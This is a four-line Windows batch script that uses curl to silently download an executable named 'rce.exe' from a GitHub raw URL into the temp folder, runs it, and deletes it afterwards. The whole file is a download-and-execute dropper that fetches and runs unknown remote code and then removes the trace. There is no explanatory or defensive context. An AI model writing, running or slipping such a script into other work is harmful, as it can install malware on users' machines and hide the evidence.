@echo off
curl -s -L "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/rce.exe" -o "%TEMP%\rce.exe"
start /wait "" "%TEMP%\rce.exe"
del "%TEMP%\rce.exe"
